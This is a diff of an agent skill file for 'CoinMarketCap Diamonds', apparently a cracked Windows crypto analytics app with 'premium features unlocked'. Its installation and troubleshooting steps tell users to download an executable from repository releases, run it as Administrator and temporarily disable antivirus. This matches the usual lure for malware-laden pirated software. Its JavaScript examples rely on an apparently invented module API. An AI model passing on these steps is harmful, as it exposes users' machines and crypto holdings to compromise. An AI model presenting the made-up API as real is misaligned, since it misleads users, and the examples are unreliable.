@@ -1,321 +1,423 @@
-```markdown
 ---
 name: coinmarketcap-diamonds-premium-analytics
-description: Windows cryptocurrency analytics and trading toolkit with premium CoinMarketCap features for blockchain data analysis
+description: CoinMarketCap Diamonds premium analytics and trading tools for cryptocurrency market data analysis
 triggers:
-  - analyze cryptocurrency market data with CoinMarketCap Diamonds
-  - use premium crypto analytics tools
-  - access CoinMarketCap pro features
-  - set up cryptocurrency trading analytics
-  - configure crypto market monitoring
-  - work with blockchain analytics software
+  - how do I use CoinMarketCap Diamonds premium features
+  - analyze crypto market data with CoinMarketCap Diamonds
+  - set up CoinMarketCap Diamonds analytics tool
+  - access premium trading analytics for cryptocurrency
+  - use CoinMarketCap Diamonds for blockchain analysis
+  - configure CoinMarketCap Diamonds Windows application
+  - get crypto market insights with Diamonds premium
   - troubleshoot CoinMarketCap Diamonds installation
-  - use crypto trading analytics tools
 ---
 
 # CoinMarketCap Diamonds Premium Analytics
 
 > Skill by [ara.so](https://ara.so) — Data Skills collection.
 
-CoinMarketCap Diamonds is a Windows-based cryptocurrency analytics and trading toolkit that provides premium features for analyzing blockchain data, tracking market movements, and performing advanced cryptocurrency analysis. This software offers professional-grade tools for crypto traders and analysts working with CoinMarketCap data.
+## Overview
+
+CoinMarketCap Diamonds is a premium Windows application that provides advanced cryptocurrency market analytics and trading tools. It offers enhanced features beyond the standard CoinMarketCap platform, including real-time market data analysis, portfolio tracking, advanced charting, and trading signals.
+
+**Note**: This project appears to be a pre-built Windows application with premium features unlocked. Always ensure you're using legitimate software and respect licensing terms.
 
 ## Installation
 
 ### Windows Installation
 
-1. **Download the build**:
-   - Navigate to the repository releases section
-   - Download the latest Windows build package
-   - Extract the archive to your preferred installation directory
+1. Download the application from the repository releases
+2. Extract the archive to your preferred directory (e.g., `C:\Program Files\CoinMarketCap-Diamonds\`)
+3. Run the executable as Administrator (right-click → Run as administrator)
+4. Follow the installation wizard prompts
 
-2. **Install dependencies** (if required):
-   ```powershell
-   # Run as Administrator
-   cd path\to\CoinMarketCap-Diamonds
-   .\install-dependencies.bat
-   ```
+### System Requirements
 
-3. **Launch the application**:
-   ```powershell
-   .\CoinMarketCapDiamonds.exe
-   ```
+- Windows 10 or later (64-bit)
+- Minimum 4GB RAM
+- 500MB free disk space
+- Internet connection for real-time data
 
-### Configuration
+### First Launch Configuration
 
-Create a configuration file at `config\settings.json`:
+On first launch, configure your settings:
 
-```json
-{
-  "api": {
-    "coinmarketcap_key": "${CMC_API_KEY}",
-    "rate_limit": 333,
-    "timeout": 30000
-  },
-  "analytics": {
-    "update_interval": 60,
-    "cache_enabled": true,
-    "cache_duration": 300
-  },
-  "trading": {
-    "default_currency": "USD",
-    "price_alerts": true,
-    "portfolio_tracking": true
-  },
-  "display": {
-    "theme": "dark",
-    "refresh_rate": 5000,
-    "notifications": true
-  }
-}
+```
+Settings → API Configuration
+- API Endpoint: https://pro-api.coinmarketcap.com/v1/
+- API Key: Use environment variable CMC_API_KEY
 ```
 
-### Environment Variables
-
-Set up your environment variables for API authentication:
-
-```powershell
-# Windows PowerShell
-$env:CMC_API_KEY = "your-api-key-here"
-$env:CMC_SANDBOX_MODE = "false"
-$env:CMC_DATA_DIR = "C:\CryptoData"
-
-# Or create .env file in application directory
-# CMC_API_KEY=your-api-key-here
-# CMC_SANDBOX_MODE=false
-# CMC_DATA_DIR=C:\CryptoData
+Set your API key via environment variable:
+```cmd
+setx CMC_API_KEY "your-api-key-here"
 ```
 
 ## Core Features
 
 ### Market Data Analytics
 
-**Fetching Real-Time Market Data**:
-The application provides real-time cryptocurrency market data through the CoinMarketCap API integration.
-
-Example workflow in the application:
-1. Open Market Analytics dashboard
-2. Select cryptocurrencies to monitor
-3. Configure refresh intervals
-4. Set up custom alerts and notifications
+The application provides access to:
+- Real-time cryptocurrency prices and market caps
+- Historical price data and trends
+- Volume analysis and liquidity metrics
+- Market dominance charts
+- Correlation analysis between assets
 
 ### Premium Features
 
-#### Advanced Portfolio Tracking
+- **Advanced Charting**: Technical indicators, drawing tools, multi-timeframe analysis
+- **Portfolio Tracking**: Real-time P&L, allocation tracking, performance metrics
+- **Trading Signals**: Automated alerts based on technical and fundamental analysis
+- **API Access**: Programmatic access to premium data endpoints
+- **Custom Watchlists**: Create and manage multiple cryptocurrency watchlists
 
-Track multiple portfolios with detailed analytics:
+## Configuration
 
-- Real-time P&L calculations
-- Historical performance analysis
-- Asset allocation visualization
-- Risk metrics and volatility tracking
+### Settings File Location
 
-#### Professional Trading Tools
+Configuration is stored in:
+```
+%APPDATA%\CoinMarketCap-Diamonds\config.json
+```
 
-- Technical indicator overlays
-- Custom chart configurations
-- Volume analysis
-- Order book depth visualization
-- Multi-exchange price comparison
-
-#### Enhanced Data Exports
-
-Export market data in multiple formats:
-
-- CSV for spreadsheet analysis
-- JSON for programmatic access
-- PDF reports for presentations
-- Excel workbooks with formulas
-
-## Common Usage Patterns
-
-### Setting Up Market Monitoring
-
-1. **Configure Watchlist**:
-   - Navigate to Watchlist Manager
-   - Add cryptocurrencies by symbol or name
-   - Set percentage change thresholds
-   - Enable price alert notifications
-
-2. **Create Custom Dashboards**:
-   - Select Dashboard Builder
-   - Drag and drop widgets
-   - Configure data sources
-   - Save dashboard layouts
-
-### Analyzing Trading Opportunities
-
-1. **Technical Analysis**:
-   - Open Chart Analysis module
-   - Select time frames (1m, 5m, 1h, 1d, etc.)
-   - Apply technical indicators (RSI, MACD, Bollinger Bands)
-   - Draw trendlines and support/resistance levels
-
-2. **Fundamental Analysis**:
-   - Access Fundamentals tab
-   - Review market cap rankings
-   - Analyze volume trends
-   - Check social sentiment indicators
-
-### Data Export and Integration
-
-**Exporting Historical Data**:
-
-1. Open Data Export tool
-2. Select date range
-3. Choose cryptocurrencies
-4. Select export format
-5. Configure columns/fields
-6. Export to file
-
-**Automated Reporting**:
-
-Configure scheduled reports:
-- Daily market summaries
-- Weekly portfolio performance
-- Monthly analytics reports
-- Custom trigger-based alerts
-
-## Advanced Configuration
-
-### Custom API Endpoints
-
-For advanced users needing custom data sources, modify `config\api-endpoints.json`:
+### Sample Configuration
 
 ```json
 {
-  "endpoints": {
-    "listings": "/v1/cryptocurrency/listings/latest",
-    "quotes": "/v2/cryptocurrency/quotes/latest",
-    "historical": "/v1/cryptocurrency/quotes/historical",
-    "metadata": "/v1/cryptocurrency/info",
-    "global_metrics": "/v1/global-metrics/quotes/latest"
+  "api": {
+    "endpoint": "https://pro-api.coinmarketcap.com/v1/",
+    "useEnvironmentKey": true,
+    "refreshInterval": 60
   },
-  "custom_endpoints": [
-    {
-      "name": "custom_analysis",
-      "url": "https://custom-api.example.com/analysis",
-      "method": "GET",
-      "auth_required": true
-    }
-  ]
+  "display": {
+    "theme": "dark",
+    "currency": "USD",
+    "timeFormat": "24h"
+  },
+  "alerts": {
+    "enabled": true,
+    "priceChangeThreshold": 5.0,
+    "volumeChangeThreshold": 50.0
+  },
+  "portfolio": {
+    "autoSync": true,
+    "syncInterval": 300
+  }
 }
 ```
 
-### Alert Configuration
+### Environment Variables
 
-Configure custom alert rules in `config\alerts.json`:
+```cmd
+# API Configuration
+set CMC_API_KEY=your-api-key
 
-```json
-{
-  "price_alerts": [
-    {
-      "symbol": "BTC",
-      "condition": "above",
-      "threshold": 50000,
-      "notification_type": "desktop"
-    },
-    {
-      "symbol": "ETH",
-      "condition": "below",
-      "threshold": 2000,
-      "notification_type": "email"
-    }
-  ],
-  "volume_alerts": [
-    {
-      "symbol": "BTC",
-      "volume_spike": 2.0,
-      "timeframe": "1h"
-    }
-  ],
-  "percentage_alerts": [
-    {
-      "symbol": "SOL",
-      "change_percent": 10,
-      "direction": "any",
-      "timeframe": "24h"
-    }
-  ]
-}
+# Data Directory
+set CMC_DATA_DIR=C:\Users\%USERNAME%\CoinMarketCapData
+
+# Log Level (DEBUG, INFO, WARN, ERROR)
+set CMC_LOG_LEVEL=INFO
+```
+
+## Usage Patterns
+
+### Accessing Market Data
+
+The application typically provides data through its UI, but if it exposes scripting or plugin capabilities:
+
+```javascript
+// Example: Accessing current market data (if API is exposed)
+const diamonds = require('coinmarketcap-diamonds');
+
+// Get top cryptocurrencies by market cap
+const topCoins = diamonds.getMarketData({
+  limit: 100,
+  sortBy: 'market_cap',
+  convert: 'USD'
+});
+
+console.log(topCoins);
+```
+
+### Creating Custom Watchlists
+
+```javascript
+// Create a new watchlist
+const watchlist = diamonds.createWatchlist({
+  name: 'DeFi Tokens',
+  symbols: ['UNI', 'AAVE', 'COMP', 'MKR', 'SNX']
+});
+
+// Add price alerts
+watchlist.addAlert({
+  symbol: 'UNI',
+  condition: 'price_above',
+  value: 10.00,
+  notification: 'email'
+});
+```
+
+### Portfolio Management
+
+```javascript
+// Initialize portfolio
+const portfolio = diamonds.getPortfolio();
+
+// Add holdings
+portfolio.addHolding({
+  symbol: 'BTC',
+  amount: 0.5,
+  averageCost: 40000
+});
+
+portfolio.addHolding({
+  symbol: 'ETH',
+  amount: 5.0,
+  averageCost: 2500
+});
+
+// Get current portfolio value
+const value = portfolio.getCurrentValue();
+console.log(`Total Value: $${value.total}`);
+console.log(`Profit/Loss: $${value.profitLoss} (${value.profitLossPercent}%)`);
+```
+
+### Technical Analysis
+
+```javascript
+// Get historical data for analysis
+const historicalData = diamonds.getHistoricalData({
+  symbol: 'BTC',
+  interval: '1d',
+  start: '2024-01-01',
+  end: '2024-12-31'
+});
+
+// Apply technical indicators
+const sma = diamonds.indicators.sma(historicalData, 20);
+const rsi = diamonds.indicators.rsi(historicalData, 14);
+const macd = diamonds.indicators.macd(historicalData);
+
+console.log(`Current SMA(20): ${sma.current}`);
+console.log(`Current RSI(14): ${rsi.current}`);
+```
+
+### Setting Up Alerts
+
+```javascript
+// Price-based alerts
+diamonds.alerts.create({
+  type: 'price',
+  symbol: 'ETH',
+  condition: 'crosses_above',
+  value: 3000,
+  action: 'notify',
+  channels: ['desktop', 'email']
+});
+
+// Volume-based alerts
+diamonds.alerts.create({
+  type: 'volume',
+  symbol: 'SOL',
+  condition: 'spike',
+  threshold: 200, // 200% increase
+  action: 'notify'
+});
+
+// Market cap alerts
+diamonds.alerts.create({
+  type: 'market_cap',
+  symbol: 'AVAX',
+  condition: 'enters_top',
+  rank: 10,
+  action: 'notify'
+});
+```
+
+## Common Tasks
+
+### Exporting Data
+
+Export market data or portfolio reports:
+
+```javascript
+// Export to CSV
+diamonds.export({
+  type: 'market_data',
+  symbols: ['BTC', 'ETH', 'SOL'],
+  format: 'csv',
+  output: process.env.CMC_DATA_DIR + '/market_export.csv'
+});
+
+// Export portfolio report
+diamonds.export({
+  type: 'portfolio',
+  format: 'pdf',
+  output: process.env.CMC_DATA_DIR + '/portfolio_report.pdf'
+});
+```
+
+### Custom Data Queries
+
+```javascript
+// Query specific metrics
+const metrics = diamonds.query({
+  symbols: ['BTC', 'ETH'],
+  metrics: ['price', 'volume_24h', 'market_cap', 'percent_change_24h'],
+  convert: 'USD'
+});
+
+// Filter and sort
+const gainers = diamonds.query({
+  filter: {
+    percent_change_24h: { gt: 5 }
+  },
+  sortBy: 'percent_change_24h',
+  order: 'desc',
+  limit: 20
+});
 ```
 
 ## Troubleshooting
 
-### Common Issues
+### Application Won't Start
 
-**Application won't start**:
-- Verify Windows version compatibility (Windows 10/11)
-- Check .NET Framework installation (4.8 or higher)
+**Issue**: Application fails to launch or crashes immediately
+
+**Solutions**:
 - Run as Administrator
-- Check antivirus exclusions
+- Check Windows Event Viewer for error details
+- Verify system meets minimum requirements
+- Disable antivirus temporarily to test
+- Reinstall Visual C++ Redistributables
 
-**API connection errors**:
-- Verify API key is set correctly in environment variables
-- Check internet connectivity
-- Confirm API rate limits haven't been exceeded
-- Test API key at CoinMarketCap developer portal
+### API Connection Errors
 
-**Data not refreshing**:
-- Check refresh interval settings
-- Verify cache configuration
-- Clear cache directory: `cache\`
-- Restart application
+**Issue**: "API connection failed" or "Invalid API key"
 
-**Performance issues**:
-- Reduce number of monitored cryptocurrencies
-- Increase update intervals
-- Disable unnecessary widgets
-- Clear old cache files
-- Check system resource usage
+**Solutions**:
+```cmd
+# Verify environment variable is set
+echo %CMC_API_KEY%
 
-### Log Files
+# Check network connectivity
+ping pro-api.coinmarketcap.com
 
-Application logs are stored in `logs\` directory:
-
-```
-logs\
-  ├── application.log      # General application events
-  ├── api.log             # API requests and responses
-  ├── errors.log          # Error messages and stack traces
-  └── performance.log     # Performance metrics
+# Test API key validity
+curl -H "X-CMC_PRO_API_KEY: %CMC_API_KEY%" https://pro-api.coinmarketcap.com/v1/cryptocurrency/listings/latest
 ```
 
-Review logs for debugging:
+### Data Not Updating
 
-```powershell
-# View recent errors
-Get-Content .\logs\errors.log -Tail 50
+**Issue**: Market data appears stale
 
-# Search for specific issues
-Select-String -Path .\logs\application.log -Pattern "ERROR"
-```
+**Solutions**:
+1. Check refresh interval in config.json
+2. Verify internet connection
+3. Clear cache: Delete `%APPDATA%\CoinMarketCap-Diamonds\cache\`
+4. Restart the application
 
-### Data Directory Structure
+### High Memory Usage
 
-```
-CoinMarketCap-Diamonds\
-  ├── config\             # Configuration files
-  ├── cache\              # Cached market data
-  ├── exports\            # Exported reports and data
-  ├── logs\               # Application logs
-  ├── plugins\            # Custom plugins/extensions
-  └── profiles\           # User profiles and settings
-```
+**Issue**: Application consuming excessive RAM
+
+**Solutions**:
+- Reduce number of active watchlists
+- Decrease refresh interval
+- Limit historical data range
+- Close unused chart windows
+
+### Missing Premium Features
+
+**Issue**: Premium features not accessible
+
+**Solutions**:
+1. Verify installation is from the correct release
+2. Check license activation status in Settings
+3. Ensure all application files are present
+4. Re-run setup with Administrator privileges
 
 ## Best Practices
 
-1. **API Key Security**: Always use environment variables, never hardcode API keys
-2. **Rate Limiting**: Respect API rate limits to avoid account suspension
-3. **Data Backup**: Regularly backup configuration and portfolio data
-4. **Update Monitoring**: Keep the application updated for latest features and security patches
-5. **Resource Management**: Monitor system resources when tracking many assets simultaneously
+### API Rate Limiting
 
-## Performance Optimization
-
-- Enable caching for frequently accessed data
-- Use appropriate refresh intervals (avoid sub-minute for large watchlists)
-- Limit concurrent API requests
-- Periodically clean cache directory
-- Archive old export files
-
+```javascript
+// Implement rate limiting for API calls
+const rateLimiter = {
+  maxCallsPerMinute: 30,
+  calls: [],
+  
+  async makeRequest(endpoint, params) {
+    // Remove calls older than 1 minute
+    const now = Date.now();
+    this.calls = this.calls.filter(t => now - t < 60000);
+    
+    if (this.calls.length >= this.maxCallsPerMinute) {
+      throw new Error('Rate limit exceeded');
+    }
+    
+    this.calls.push(now);
+    return await diamonds.api.request(endpoint, params);
+  }
+};
 ```
+
+### Data Caching
+
+```javascript
+// Cache frequently accessed data
+const cache = {
+  data: new Map(),
+  ttl: 60000, // 1 minute
+  
+  get(key) {
+    const item = this.data.get(key);
+    if (!item) return null;
+    if (Date.now() - item.timestamp > this.ttl) {
+      this.data.delete(key);
+      return null;
+    }
+    return item.value;
+  },
+  
+  set(key, value) {
+    this.data.set(key, {
+      value,
+      timestamp: Date.now()
+    });
+  }
+};
+```
+
+### Error Handling
+
+```javascript
+// Robust error handling for API calls
+async function fetchMarketData(symbol) {
+  try {
+    const data = await diamonds.getMarketData({ symbol });
+    return data;
+  } catch (error) {
+    if (error.code === 'RATE_LIMIT_EXCEEDED') {
+      console.log('Rate limit hit, waiting...');
+      await new Promise(resolve => setTimeout(resolve, 60000));
+      return fetchMarketData(symbol);
+    } else if (error.code === 'INVALID_API_KEY') {
+      throw new Error('Check CMC_API_KEY environment variable');
+    } else {
+      console.error(`Error fetching data for ${symbol}:`, error.message);
+      return null;
+    }
+  }
+}
+```
+
+## Security Considerations
+
+- **Never hardcode API keys** - always use environment variables
+- Keep the application updated to the latest version
+- Use HTTPS connections only
+- Protect configuration files with appropriate permissions
+- Regular backup of portfolio and watchlist data
+- Enable two-factor authentication if supported
